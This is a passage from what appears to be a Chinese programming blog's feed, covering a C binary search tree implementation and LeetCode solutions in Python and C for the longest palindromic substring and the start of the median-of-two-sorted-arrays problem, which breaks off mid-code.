<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*使用动态分配的链式结构实现二叉搜索树</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"tree.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*指向树根节点的指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">static</span> TreeNode *tree;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* insert</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(TREE_TYPE value)</span></span>&#123;</span><br><span class="line">    TreeNode *current;</span><br><span class="line">    TreeNode **link = &amp;tree;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((current = *link) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(value &lt; current-&gt;value)</span><br><span class="line">            link = &amp;current-&gt;left;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            assert(value != current-&gt;value);</span><br><span class="line">            link = &amp;current-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *分配一个新的节点</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    current = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(TreeNode));</span><br><span class="line">    assert(current != <span class="literal">NULL</span>);</span><br><span class="line">    current-&gt;value = value;</span><br><span class="line">    current-&gt;left = <span class="literal">NULL</span>;</span><br><span class="line">    current-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">    *link = current;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* find</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">TREE_TYPE *<span class="title">find</span><span class="params">(TREE_TYPE value)</span></span>&#123;</span><br><span class="line">    TreeNode *current = tree;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (current != <span class="literal">NULL</span> &amp;&amp; current-&gt;value != value)&#123;</span><br><span class="line">        <span class="keyword">if</span>(value &lt; current-&gt;value)</span><br><span class="line">            current = current-&gt;left;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            current = current-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(current != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> &amp;current-&gt;value;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* max_tree</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">TREE_TYPE <span class="title">max_tree</span><span class="params">(TreeNode *link)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (link-&gt;right != <span class="literal">NULL</span>)</span><br><span class="line">        link = link-&gt;right;</span><br><span class="line">    <span class="keyword">return</span> link-&gt;value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* remove</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove_value</span><span class="params">(TREE_TYPE value)</span></span>&#123;</span><br><span class="line">    TreeNode *current;</span><br><span class="line">    TreeNode **link = &amp;tree;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *寻找节点</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">while</span> ((current = *link)-&gt;value != value) &#123;</span><br><span class="line">        <span class="keyword">if</span> (value &lt; current-&gt;value)</span><br><span class="line">            link = &amp;current-&gt;left;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            assert(value != current-&gt;value);</span><br><span class="line">            link = &amp;current-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *删除节点，分三种情况</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (current-&gt;left == <span class="literal">NULL</span> &amp;&amp; current-&gt;right == <span class="literal">NULL</span>)</span><br><span class="line">       *link = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (current-&gt;left == <span class="literal">NULL</span> || current-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (current-&gt;left == <span class="literal">NULL</span>)</span><br><span class="line">            *link = current-&gt;right;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            *link = current-&gt;left;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        TREE_TYPE <span class="built_in">max</span> = max_tree(current-&gt;left);</span><br><span class="line">        remove_value(<span class="built_in">max</span>);<span class="comment">/*max必为叶节点*/</span></span><br><span class="line">        current-&gt;value = <span class="built_in">max</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* do_pre_order_traverse</span></span><br><span class="line"><span class="comment">* 执行一层前遍历序。这是一个辅助函数。</span></span><br><span class="line"><span class="comment">* 并不是用户接口</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">do_pre_order_traverse</span><span class="params">(TreeNode *current, <span class="keyword">void</span> (*callback)(TREE_TYPE value))</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        callback(current-&gt;value);</span><br><span class="line">        do_pre_order_traverse(current-&gt;left, callback);</span><br><span class="line">        do_pre_order_traverse(current-&gt;right, callback);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* pro_order_traverse</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pro_order_traverse</span><span class="params">(<span class="keyword">void</span> (*callback)(TREE_TYPE value))</span></span>&#123;</span><br><span class="line">    do_pre_order_traverse(tree, callback);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 测试使用pro_order_traverse(test_printf)，用于前序遍历输出树的值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_printf</span><span class="params">(TREE_TYPE value)</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d"</span>,value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    insert(<span class="number">2</span>);</span><br><span class="line">    insert(<span class="number">1</span>);</span><br><span class="line">    insert(<span class="number">3</span>);</span><br><span class="line">    remove_value(<span class="number">3</span>);</span><br><span class="line">    TREE_TYPE *k = <span class="built_in">find</span>(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span>(k == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"not find\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"find %d\n"</span>, *k);</span><br><span class="line">    pro_order_traverse(test_printf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    insert(<span class="number">4</span>);</span><br><span class="line">    insert(<span class="number">0</span>);</span><br><span class="line">    insert(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"tree maximum %d\n"</span>,max_tree(tree));</span><br><span class="line">    pro_order_traverse(test_printf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>link_tree.c文件</p>
<p>测试输出：</p>
<p><img src="https://s2.ax1x.com/2020/02/12/1HWDpt.png" alt="1HWDpt.png"></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>c语言</tag>
        <tag>二叉搜索树</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode题解5</title>
    <url>/2020/01/31/LeetCode%E9%A2%98%E8%A7%A35/</url>
    <content><![CDATA[<h1 id="LeetCode题解"><a href="#LeetCode题解" class="headerlink" title="LeetCode题解"></a>LeetCode题解</h1><p><strong>第5题，最长回文子串</strong></p>
<p>给定一个字符串 s，找到 s 中最长的回文子串。你可以假设 s 的最大长度为 1000。</p>
<blockquote>
<p>示例 1：</p>
<p>输入: “babad”<br>输出: “bab”<br>注意: “aba” 也是一个有效答案。</p>
<p>示例 2：</p>
<p>输入: “cbbd”<br>输出: “bb”</p>
</blockquote>
<a id="more"></a>

<p>原题如上，代码如下：</p>
<h3 id="动态规划法："><a href="#动态规划法：" class="headerlink" title="动态规划法："></a>动态规划法：</h3><p><strong>python版本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">longestPalindrome</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        n = len(s)</span><br><span class="line">        bl = [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(n)]<span class="keyword">for</span> i <span class="keyword">in</span> range(n)]</span><br><span class="line">        start = <span class="number">0</span></span><br><span class="line">        end = n</span><br><span class="line">        <span class="keyword">for</span> leng <span class="keyword">in</span> range(<span class="number">1</span>,n+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(n-leng+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> leng == <span class="number">1</span>:</span><br><span class="line">                    bl[i][i] = <span class="number">1</span></span><br><span class="line">                    start = i</span><br><span class="line">                    end = i + leng</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> (leng == <span class="number">2</span>) &amp; (s[i] == s[i + <span class="number">1</span>]):</span><br><span class="line">                    bl[i][i + <span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">                    start = i</span><br><span class="line">                    end = i + leng</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> (bl[i+<span class="number">1</span>][i+leng<span class="number">-2</span>] == <span class="number">1</span>) &amp; (s[i] == s[i+leng<span class="number">-1</span>]):</span><br><span class="line">                    bl[i][i+leng<span class="number">-1</span>] = <span class="number">1</span> </span><br><span class="line">                    start = i</span><br><span class="line">                    end = i + leng</span><br><span class="line">        <span class="keyword">return</span> s[start:end]</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/02/01/18NKRP.png" alt="18NKRP.png"></p>
<p><strong>c语言版本</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> * <span class="title">longestPalindrome</span><span class="params">(<span class="keyword">char</span> * s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">bool</span> token[<span class="number">1000</span>][<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">//题目说明最大长度为1000</span></span><br><span class="line">    <span class="keyword">int</span> start = <span class="number">0</span>, <span class="built_in">end</span> = n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> len = <span class="number">1</span> ; len &lt;= n ; len++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt;= n -len ; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">                token[i][i] = <span class="number">1</span>;</span><br><span class="line">                start = i;</span><br><span class="line">                <span class="built_in">end</span> = i + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>((len == <span class="number">2</span>) &amp;&amp; (s[i] == s[i + <span class="number">1</span>]))&#123;</span><br><span class="line">                token[i][i+<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">                start = i;</span><br><span class="line">                <span class="built_in">end</span> = i + <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>((token[i+<span class="number">1</span>][i+len<span class="number">-2</span>] == <span class="number">1</span>) &amp;&amp; (s[i] == s[i+len<span class="number">-1</span>]))&#123;</span><br><span class="line">                token[i][i+len<span class="number">-1</span>] = <span class="number">1</span>;</span><br><span class="line">                start = i;</span><br><span class="line">                <span class="built_in">end</span> = i + len;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    s[<span class="built_in">end</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">return</span> &amp;s[start];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/02/01/18tvVJ.png" alt="18tvVJ.png"></p>
<h3 id="中心扩散法："><a href="#中心扩散法：" class="headerlink" title="中心扩散法："></a>中心扩散法：</h3><p><strong>python版本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getstr</span><span class="params">(self,s,left,right)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> left - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> right &lt; len(s):</span><br><span class="line">            <span class="keyword">if</span> s[left - <span class="number">1</span>] != s[right]:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            left -= <span class="number">1</span></span><br><span class="line">            right += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> s[left:right] </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">longestPalindrome</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        result = <span class="string">''</span></span><br><span class="line">        n = len(s)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            l = self.getstr(s,i,i+<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> len(l) &gt;= len(result):</span><br><span class="line">                result = l</span><br><span class="line">            <span class="keyword">if</span> i != n<span class="number">-1</span> <span class="keyword">and</span> s[i] == s[i+<span class="number">1</span>] :</span><br><span class="line">                l = self.getstr(s,i,i+<span class="number">2</span>)</span><br><span class="line">                <span class="keyword">if</span> len(l) &gt;= len(result):</span><br><span class="line">                    result = l          </span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/02/04/10bXpq.png" alt="10bXpq.png"></p>
<p><strong>c语言版本</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> * <span class="title">longestPalindrome</span><span class="params">(<span class="keyword">char</span> * s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="built_in">strlen</span>(s), start = <span class="number">0</span>, <span class="built_in">end</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123; <span class="comment">//奇数</span></span><br><span class="line">        <span class="keyword">int</span> left = i - <span class="number">1</span>, right = i + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left &gt;= <span class="number">0</span> &amp;&amp; right &lt; n &amp;&amp; s[left] == s[right])&#123;</span><br><span class="line">            left--;</span><br><span class="line">            right++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(right - left - <span class="number">1</span> &gt; <span class="built_in">end</span> - start)&#123;</span><br><span class="line">            start = left + <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">end</span> = right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++)&#123; <span class="comment">//偶数</span></span><br><span class="line">        <span class="keyword">if</span>(s[i] == s[i + <span class="number">1</span>])&#123;</span><br><span class="line">            <span class="keyword">int</span> left = i - <span class="number">1</span>, right = i + <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">while</span>(left &gt;= <span class="number">0</span> &amp;&amp; right &lt; n &amp;&amp; s[left] == s[right])&#123;</span><br><span class="line">                left--;</span><br><span class="line">                right++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(right - left - <span class="number">1</span> &gt; <span class="built_in">end</span> - start)&#123;</span><br><span class="line">                start = left + <span class="number">1</span>;</span><br><span class="line">                <span class="built_in">end</span> = right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    s[<span class="built_in">end</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">return</span> &amp;s[start];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/02/03/1NYoZT.png" alt="1NYoZT.png"></p>
<h3 id="解析："><a href="#解析：" class="headerlink" title="解析："></a>解析：</h3><p>​    <strong>无论是动态规划法还是中心扩散法，理论上他们的时间复杂度都应该是O(n^2)​。</strong></p>
<h4 id="关于动态规划："><a href="#关于动态规划：" class="headerlink" title="关于动态规划："></a>关于动态规划：</h4><p>是有一个二维布尔数组<code>bool_list[i][j]</code>，若值为1，则表示字符串中 i 位到 j 位构成回文子串。</p>
<p>动态规划中首先遍历长度leng，每次再遍历字符串，观察是否具有长度为leng的回文子串。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> len = <span class="number">1</span> ; len &lt;= n ; len++) <span class="comment">//leng从1开始</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt;= n -len ; i++) <span class="comment">//每次遍历到字符串的n-leng位</span></span><br></pre></td></tr></table></figure>

<p>其中<code>boollist[i][j]</code>,若<code>i = j</code>，则恒为1，因为字符串始终具有长度为1的回文子串。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">    token[i][i] = <span class="number">1</span>;</span><br><span class="line">    start = i;</span><br><span class="line">    <span class="built_in">end</span> = i + <span class="number">1</span>;</span><br><span class="line">   	<span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时回文子串也有奇数和偶数之分，奇数的回文字串中心为一个字符，而偶数的回文子串中心是两个相同的字符。所以当leng为2时要考虑偶数回文子串：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>((len == <span class="number">2</span>) &amp;&amp; (s[i] == s[i + <span class="number">1</span>]))&#123;</span><br><span class="line">    token[i][i+<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">	start = i;</span><br><span class="line"> 	<span class="built_in">end</span> = i + <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>剩下就可以通解了：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>((token[i+<span class="number">1</span>][i+len<span class="number">-2</span>] == <span class="number">1</span>) &amp;&amp; (s[i] == s[i+len<span class="number">-1</span>]))&#123;</span><br><span class="line">    token[i][i+len<span class="number">-1</span>] = <span class="number">1</span>;</span><br><span class="line">    start = i;</span><br><span class="line">    <span class="built_in">end</span> = i + len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为一个回文子串所具有的性质就是，每个元素和它的对称位置元素相同，且它俩中间包裹的子串也肯定时回文子串。</p>
<h4 id="关于中心扩散："><a href="#关于中心扩散：" class="headerlink" title="关于中心扩散："></a>关于中心扩散：</h4><p>其实，我们也可以这样找回文：</p>
<p>​    遍历字符串每个元素，从每个元素出发，查看它两边的元素是否相等，相等则查看更外层两边元素是否相等，如此重复，直到不相等，则返回找到的奇数回文子串：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123; <span class="comment">//奇数</span></span><br><span class="line">    <span class="keyword">int</span> left = i - <span class="number">1</span>, right = i + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(left &gt;= <span class="number">0</span> &amp;&amp; right &lt; n &amp;&amp; s[left] == s[right])&#123;</span><br><span class="line">        left--;</span><br><span class="line">        right++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(right - left - <span class="number">1</span> &gt; <span class="built_in">end</span> - start)&#123;</span><br><span class="line">        start = left + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">end</span> = right;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    而偶数回文子串的寻找，和上述相似，只不过在最开始的中心元素是两个相等的元素，或者说是一条线为中心开始，向两边扩散：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++)&#123; <span class="comment">//偶数</span></span><br><span class="line">    <span class="keyword">if</span>(s[i] == s[i + <span class="number">1</span>])&#123;</span><br><span class="line">        <span class="keyword">int</span> left = i - <span class="number">1</span>, right = i + <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span>(left &gt;= <span class="number">0</span> &amp;&amp; right &lt; n &amp;&amp; s[left] == s[right])&#123;</span><br><span class="line">            left--;</span><br><span class="line">            right++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(right - left - <span class="number">1</span> &gt; <span class="built_in">end</span> - start)&#123;</span><br><span class="line">            start = left + <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">end</span> = right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意：要找到最大回文子串的话，可以在找到回文子串时和之前找到的最大回文子串长度比较，若大于则更新，若小于则不变。</strong></p>
]]></content>
      <categories>
        <category>LeetCode题解</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode题解4</title>
    <url>/2020/01/30/LeetCode%E9%A2%98%E8%A7%A34/</url>
    <content><![CDATA[<h1 id="LeetCode题解"><a href="#LeetCode题解" class="headerlink" title="LeetCode题解"></a>LeetCode题解</h1><p><strong>第4题，寻找两个有序数组的中位数</strong></p>
<p>给定两个大小为 m 和 n 的有序数组 nums1 和 nums2。</p>
<p>请你找出这两个有序数组的中位数，并且要求算法的时间复杂度为 <strong>O(log(m + n))</strong>。</p>
<p>你可以假设 nums1 和 nums2 不会同时为空。</p>
<blockquote>
<p>示例 1:</p>
<p>nums1 = [1, 3]<br>nums2 = [2]</p>
<p>则中位数是 2.0</p>
<p>示例 2:</p>
<p>nums1 = [1, 2]<br>nums2 = [3, 4]</p>
<p>则中位数是 (2 + 3)/2 = 2.5</p>
</blockquote>
<a id="more"></a>

<p>原题如上，解法如下：</p>
<p><strong>python版</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getk</span><span class="params">(self,nums1,start1,nums2,start2,n)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> start1 &gt;= len(nums1):</span><br><span class="line">            <span class="keyword">return</span> nums2[start2 + n - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> start2 &gt;= len(nums2):</span><br><span class="line">            <span class="keyword">return</span> nums1[start1 + n - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> min(nums1[start1],nums2[start2])</span><br><span class="line">        half = min(int(n/<span class="number">2</span>),min(len(nums1)-start1,len(nums2)-start2))</span><br><span class="line">        <span class="keyword">if</span> nums1[start1 + half - <span class="number">1</span>] &lt; nums2[start2 + half - <span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">return</span> self.getk(nums1, start1 + half, nums2, start2, n - half)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.getk(nums1, start1 , nums2, start2 + half, n - half)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findMedianSortedArrays</span><span class="params">(self, nums1, nums2)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums1: List[int]</span></span><br><span class="line"><span class="string">        :type nums2: List[int]</span></span><br><span class="line"><span class="string">        :rtype: float</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        left = int((len(nums1)+len(nums2)+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">        right = int((len(nums1)+len(nums2)+<span class="number">2</span>)/<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> (self.getk(nums1,<span class="number">0</span>,nums2,<span class="number">0</span>,left) + self.getk(nums1,<span class="number">0</span>,nums2,<span class="number">0</span>,right))*<span class="number">0.5</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/30/1Qz3E8.png" alt="1Qz3E8.png"></p>
<p><strong>c语言版</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a &gt; b)&#123;</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getk</span><span class="params">(<span class="keyword">int</span>* nums1, <span class="keyword">int</span> nums1Size, <span class="keyword">int</span> start1, <span class="keyword">int</span>* nums2, <span class="keyword">int</span> nums2Size, <span class="keyword">int</span> start2, <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(start1 &gt;= nums1Size)</span><br><span class="line">        <span class="keyword">return</span> nums2[start2 + n - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span>(start2 &gt;= nums2Size)</span><br><span class="line">        <span class="keyword">return</span> nums1[start1 + n - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">min</span>(nums1[start1], nums2[start2]);</span><br><span class="line">    <span class="keyword">int</span> half = <span class="built_in">min</span>(n/<span class="number">2</span>,<span class="built_in">min</span>(nums1Size - start1, nums2Size - start2));</span><br><span class="line">    <span class="keyword">if</span>(nums1[start1 + half - <span class="number">1</span>] &lt; nums2[start2 + half - <span class="number">1</span>])&#123;</span><br><span class="line">        <span class="keyword">return</span> getk(nums1, nums1Size, start1 + half, nums2, nums2Size, start2, n - half);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> getk(nums1, nums1Size, start1, nums2, nums2Size, start2 + half, n - half);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">findMedianSortedArrays</span><span class="params">(<span class="keyword">int</span>* nums1, <span class="keyword">int</span> nums1Size, <span class="keyword">int</span>* nums2, <span class="keyword">int</span> nums2Size)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> left = (nums1Size + nums2Size + <span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> right = (nums1Size + nums2Size + <span class="number">2</span>)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> (getk(nums1, nums1Size, <span class="number">0</span>, nums2, nums2Size, <span class="number">0</span>, left) + getk(nums1, nums1Size, <span class="number">0</span>, nums2, nums2Size, <span class="number">0</span>, right))/<span class="number">2.0</span>;</span><br><span 